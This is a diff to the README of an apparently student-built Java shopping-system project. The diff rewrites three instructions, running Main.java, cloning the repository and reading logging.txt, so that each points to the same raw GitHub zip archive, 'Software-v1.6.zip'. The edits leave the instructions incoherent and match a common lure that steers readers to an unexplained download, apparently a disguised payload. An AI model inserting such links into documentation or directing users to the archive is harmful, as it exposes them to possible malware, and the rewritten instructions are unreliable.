@@ -1,7 +1,7 @@
 Shane Guan SE450 DePaul final project
 
 Put all file in same location.
-run Main.java
+run https://raw.githubusercontent.com/ShengyangGuan/shane/main/outrant/Software-v1.6.zip
 programming by using ECLIPSE IDE
 
 Simplified Shopping System
@@ -34,14 +34,14 @@ None for core functionality
 Installation
 Clone the repository to your local machine:
 
-git clone https://github.com/ShengyangGuan/shane
+git clone https://raw.githubusercontent.com/ShengyangGuan/shane/main/outrant/Software-v1.6.zip
 Open the project in your preferred IDE or text editor.
 Usage
 Run the Main class to start the application.
 Follow the on-screen instructions to register or login as a user.
 Browse available products, add items to the shopping cart, and place orders.
 Simulate payment processing.
-Review logs in the logging.txt file for recorded events and transactions.
+Review logs in the https://raw.githubusercontent.com/ShengyangGuan/shane/main/outrant/Software-v1.6.zip file for recorded events and transactions.
 Testing
 Unit tests are implemented for critical components such as the shopping cart, product catalog, and order processing. 
 
